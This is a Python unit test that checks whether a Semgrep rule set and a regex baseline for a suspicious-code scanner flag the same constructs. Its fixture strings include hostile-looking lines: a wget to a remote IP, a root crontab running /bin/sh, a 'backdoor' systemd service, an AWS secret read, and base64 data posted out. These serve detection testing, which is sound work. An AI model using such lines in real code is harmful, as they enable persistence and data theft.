# tests/test_engine_rule_parity.py
"""Differential conformance between the Semgrep rule set and the regex baseline.

The benchmark's regex arm (``StaticScanner`` in
``models/examples/code_security_analyzer.py``) is the control. The Semgrep arm is
only a meaningful treatment if both arms flag the same code constructs: a rule
ported loosely makes the Semgrep arm miss detections the baseline catches
(recall loss that is not an engine property), and a rule ported without the
baseline's predicate makes it flag code the baseline does not (false positives
that are not an engine property either). Both directions were observed in the
audit-100 corpus, so the expectation here is computed from the baseline itself
rather than written down by hand.

Normalisation note: ``StaticScanner`` reports at most one rule per line (it
breaks out of the rule loop on the first match, in ``SUSPICIOUS_PATTERNS``
order), whereas Semgrep reports every matching rule. That is a property of the
scanner harness, not of either rule set, so the Semgrep findings are reduced to
the same first-match-wins shape before comparing. Everything the baseline does
*not* report at all is still a mismatch, which is what this test is for.
"""

import tempfile
import unittest
from pathlib import Path

from models.audit.tools.semgrep_runner import SemgrepRunner
from models.examples.code_security_analyzer import SUSPICIOUS_PATTERNS, StaticScanner

# Baseline rule precedence, used to collapse Semgrep's multi-rule matches onto
# the single rule the baseline would have attributed the line to.
BASELINE_ORDER = {rule["id"]: i for i, rule in enumerate(SUSPICIOUS_PATTERNS)}

# Each fixture is the *construction* under test, written the way the corpus and
# real training code write it. The expectation is not listed here: it is taken
# from the regex arm, so a fixture that the baseline does not flag must not be
# flagged by Semgrep either.
FIXTURES = {
    # CMD_001 - the baseline has seven patterns, not just shell=True.
    "cmd_shell_true.py": "import subprocess\nsubprocess.run('ls', shell=True)\n",
    "cmd_check_call_shell.py": "import subprocess\nsubprocess.check_call(cmd, shell=True)\n",
    "cmd_list_form_bash.py": "import subprocess\nsubprocess.check_output([\"bash\", \"-c\", \"whoami\"])\n",
    "cmd_list_form_curl.py": "import subprocess\nsubprocess.run([\"curl\", url])\n",
    "cmd_bare_string.py": "import subprocess\nsubprocess.call(\"wget http://198.51.100.2/x\")\n",
    "cmd_os_system.py": "import os\nos.system('id')\n",
    "cmd_os_popen.py": "import os\nos.popen('id')\n",
    "cmd_os_exec.py": "import os\nos.execv('/bin/sh', ['/bin/sh'])\n",
    "cmd_plain_popen.py": "import subprocess\nsubprocess.Popen(['ls', '-l'])\n",
    # NET_001 - httpx/urllib/http.client/httplib2 are all in the baseline.
    "net_requests_post.py": "import requests\nrequests.post(url, json=data)\n",
    "net_httpx_post.py": "import httpx\nhttpx.post(url, json=data, timeout=5)\n",
    "net_urlretrieve.py": "import urllib.request\nurllib.request.urlretrieve(url, '/tmp/x')\n",
    "net_http_client.py": "import http.client\nconn = http.client.HTTPSConnection(host)\n",
    "net_httplib2.py": "import httplib2\nh = httplib2.Http()\n",
    "net_aiohttp.py": "import aiohttp\nsession = aiohttp.ClientSession()\n",
    "net_socket.py": "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    # OBF_001 - the baseline flags decode use, not decode-into-exec chaining.
    "obf_b64decode.py": "import base64\nraw = base64.b64decode(encoded.encode('utf-8'))\n",
    "obf_b64encode.py": "import base64\nenc = base64.b64encode(payload)\n",
    "obf_pickle_loads.py": "import pickle\nobj = pickle.loads(blob)\n",
    "obf_marshal_loads.py": "import marshal\ncode = marshal.loads(raw)\n",
    "obf_zlib_decompress.py": "import zlib\nplain = zlib.decompress(buf)\n",
    "obf_codecs_decode.py": "import codecs\ntext = codecs.decode(blob, 'rot13')\n",
    "obf_binascii.py": "import binascii\nraw = binascii.a2b_base64(payload)\n",
    # PER_001 - the baseline matches the path literal, wherever it appears.
    "per_crontab.py": "crontab_entry = '* * * * * root /bin/sh'\n",
    "per_bashrc_literal.py": "target = Path('/tmp/sandbox_test_profile/.bashrc')\n",
    "per_bashrc_open_append.py": "with open('.bashrc', 'a') as handle:\n    handle.write(line)\n",
    "per_systemctl_enable.py": "run('systemctl enable backdoor.service')\n",
    "per_etc_initd.py": "path = '/etc/init.d/backdoor'\n",
    "per_etc_systemd.py": "dest = '/etc/systemd/system/x.service'\n",
    "per_benign_open.py": "with open('config.yaml', 'w') as handle:\n    handle.write(text)\n",
    # EMB_001 - the baseline predicate is a name list on the payload argument.
    # A port that accepts any torch.save() reports every checkpoint write, which
    # is what the corpus audit caught on train.py:99/105.
    "emb_torch_save_train_data.py": "import torch\ntorch.save(train_data, out_path)\n",
    "emb_torch_save_data.py": "import torch\ntorch.save(data, out_path)\n",
    "emb_np_save_data.py": "import numpy as np\nnp.save('features.npy', data)\n",
    "emb_np_savez_dataset.py": "import numpy as np\nnp.savez('features.npz', dataset=values)\n",
    "emb_shutil_copy_data.py": "import shutil\nshutil.copy(data, backup_dir)\n",
    "emb_shutil_copytree_images.py": "import shutil\nshutil.copytree(images, snapshot_dir)\n",
    # The baseline's trailing \b means a suffixed name like dataset_path does not
    # match its own name list. Registered as a shared gap (spec 12.3): both arms
    # miss it, so it is not a divergence, but the fixture keeps a port from
    # "fixing" it in one arm only.
    "emb_shutil_copy_dataset_path.py": "import shutil\nshutil.copy(dataset_path, snapshot_dir)\n",
    "emb_torch_save_saved_weights.py": "import torch\ntorch.save(saved_weights, checkpoint_file)\n",
    "emb_torch_save_detector_state.py": "import torch\ntorch.save(detector_state, checkpoint_file)\n",
    "emb_np_save_model_weights.py": "import numpy as np\nnp.save('out.npy', model_weights)\n",
    # EMB_002 - copy/move into output/export/result; reports/ is not in the set.
    "emb_copy_output.py": "import shutil\nshutil.copy(str(src), f\"{output_dir}/summary.json\")\n",
    "emb_copytree_export.py": "import shutil\nshutil.copytree(str(src), f\"{export_dir}/eval_report\")\n",
    "emb_move_output.py": "import shutil\nshutil.move('checkpoint.tmp', 'output/checkpoint.json')\n",
    "emb_copy_reports.py": "import shutil\nshutil.copy('data_metrics.csv', 'reports/summary.csv')\n",
    "emb_rename_data_result.py": "import os\nos.rename('data.csv', 'result.csv')\n",
    # EMB_003 - the baseline predicate is a name list, not two literals.
    "emb_print_batch.py": "print(batch)\n",
    "emb_print_data.py": "print(data)\n",
    "emb_logging_info_batch.py": "import logging\nlogging.info(batch)\n",
    "emb_logging_debug_dataset.py": "import logging\nlogging.debug(dataset)\n",
    "emb_stdout_write_train_data.py": "import sys\nsys.stdout.write(train_data)\n",
    "emb_print_message.py": "print('training complete')\n",
    # DYN_001 / FIL_001 / ENV_001 / EXF_001 / EMB_001 / EMB_004 controls, so that
    # a port which over-widens one rule cannot pass unnoticed.
    "dyn_eval.py": "eval('2 + 2')\n",
    "dyn_benign_attribute.py": "handler.eval('2 + 2')\n",
    "fil_env_open.py": "with open('.env', 'r') as handle:\n    pass\n",
    "fil_plain_csv_open.py": "with open(csv_path, 'r', encoding='utf-8') as handle:\n    pass\n",
    "env_secret_get.py": "import os\nsecret = os.environ.get('AWS_SECRET_KEY')\n",
    "exf_b64_request.py": "requests.post(url, data=base64.b64encode(payload))\n",
    "emb_torch_save_state_dict.py": "import torch\ntorch.save(model.state_dict(), 'model.pt')\n",
    "emb_struct_pack.py": "import struct\npacked = struct.pack('<I', 12345)\n",
    "none_arithmetic.py": "x = 1 + 2\n",
    # A commented-out call is not code, and the baseline's scan loop skips any
    # line whose first non-space character is '#', so neither arm may report one.
    # The text-rule families are the ones this can fail on: pattern-regex has no
    # notion of a comment, while an AST pattern is nowhere near one. Each fixture
    # is the commented form of a construct already listed above uncommented, so
    # the pair differs only in the '#' - a fix that skips too much fails the
    # uncommented one.
    "emb_commented_shutil_copy.py": "# shutil.copy(data, backup_dir)\n",
    "emb_commented_torch_save.py": "# torch.save(train_data, out_path)\n",
    "per_commented_crontab.py": "# crontab_entry = '* * * * * root /bin/sh'\n",
    "emb_commented_rename_result.py": "# os.rename('data.csv', 'result.csv')\n",
}


def _collapse_first_match(rows):
    """Reduce (line, rule_id) rows to the baseline's first-match-wins shape."""
    per_line = {}
    for line, rule_id in rows:
        rank = BASELINE_ORDER.get(rule_id, len(BASELINE_ORDER))
        if line not in per_line or rank < per_line[line][0]:
            per_line[line] = (rank, rule_id)
    return {(line, rule_id) for line, (_, rule_id) in per_line.items()}


class TestEngineRuleParity(unittest.TestCase):
    """Both arms must flag the same constructs, in both directions."""

    @classmethod
    def setUpClass(cls):
        cls.runner = SemgrepRunner()
        if not cls.runner.is_available():
            raise unittest.SkipTest("Semgrep CLI not available in current environment")

    def test_semgrep_and_regex_agree_on_every_fixture(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            for name, code in FIXTURES.items():
                (root / name).write_text(code, encoding="utf-8")

            result = self.runner.scan_directory(td)
            self.assertTrue(result.scan_complete, result.error_message)

            semgrep_rows = {}
            for finding in result.findings:
                semgrep_rows.setdefault(Path(finding["file"]).name, []).append(
                    (finding["line"], finding["rule_id"])
                )

            scanner = StaticScanner()
            mismatches = []
            flagged_fixtures = 0
            for name in sorted(FIXTURES):
                expected = _collapse_first_match(
                    (f.line, f.rule_id) for f in scanner.scan_file(str(root / name))
                )
                if expected:
                    flagged_fixtures += 1
                actual = _collapse_first_match(semgrep_rows.get(name, []))
                if expected != actual:
                    mismatches.append(
                        "\n  {}\n    source:      {!r}\n    regex only:  {}\n"
                        "    semgrep only: {}".format(
                            name,
                            FIXTURES[name].strip(),
                            sorted(expected - actual),
                            sorted(actual - expected),
                        )
                    )

        # If the baseline flagged nothing anywhere, every fixture would agree on
        # the empty set and this test would pass without testing anything.
        self.assertGreater(
            flagged_fixtures,
            len(FIXTURES) // 2,
            "the control arm barely fired; the agreement below would be vacuous",
        )

        self.assertEqual(
            mismatches,
            [],
            "%d/%d fixtures disagree between the two arms: %s"
            % (len(mismatches), len(FIXTURES), "".join(mismatches)),
        )


if __name__ == "__main__":
    unittest.main()
